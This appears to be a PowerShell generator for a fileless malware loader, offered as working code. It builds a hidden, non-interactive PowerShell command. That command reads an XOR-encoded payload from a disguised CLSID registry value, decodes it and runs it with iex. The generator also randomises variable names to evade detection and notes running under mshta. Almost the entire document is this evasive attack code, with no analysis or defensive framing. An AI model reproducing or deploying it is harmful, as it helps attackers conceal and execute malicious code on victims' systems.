# INPUT PARAMS...
    # $mr2, reg key hk(lm|cu):\software\classes\CLSID\<random_GUID_0>\ProgId
    # $rk0, last 4 characters of random_GUID_0
    # $gr0, random number 0-254, encode/decode key
    # $pu9, bool, if true (WIN10 workstation) don't run powershell with the arguments necessary to 
        # visually hide it's execution in a desktop environment because we're running powershell
        # under mshta anyways? If false (non-WIN10 workstation), run with those arguments.

# OUTPUT: a powershell loader (string containing script) that reads the reg key 
    # hk(lm|cu):\software\classes\CLSID\<random_GUID_0>\ProgId, for entry <last_four_characters_of
    # _GUID_0>, decodes the value with a rotating XOR where the key is $gr0, and invokes the script

$au7 = "`"";

if ($pu9) {
	$au7 = "`"`"`"`"";
    $tw3 = "" 
}
else {
    $tw3 = " -windowstyle mInimized -NoLogo -WindowStyle Hidden -nop -NonInteractive" 
}

$di7="powershell"+$tw3+" -c "+$au7+"&{
	__A=[System.Text.Encoding]::UTF8;
__B=Get-ItemProperty -Path(__A.GetString([Convert]::FromBase64String('"+(de8 $mr2)+"'))) -n '"+$rk0+"'|Select-Object -ExpandProperty '"+$rk0+"';
__C="+$gr0+";
iex(__A.GetString(`$(for(__D=0;
__D -lt __B.Length;
__D++){
	if(__C -ge 250){
	__C=0
}
__B[__D] -bxor __C;
__C+=4
}
)))
}
"+$au7;

$hb2="__A","__B","__C","__D";
$bm7=@();

# populate $bm7 with 4 powershell variables of the format...
# $<2_random_lowercase><1_integer>
for($bg6=0; $bg6 -lt 4; $bg6++){
	$bm7 = $bm7 + ("`$"+(nj0 2)+(-join ((48..57)|Get-Random -Count 1|%{
	    [char]$_
    })))
}

# replace __A, __B, etc. with those variable names in the above code
$bg6=0;
for($bg6=0; $bg6 -lt 4; $bg6++){
	$di7=$di7.Replace($hb2[$bg6],$bm7[$bg6])
}

$di7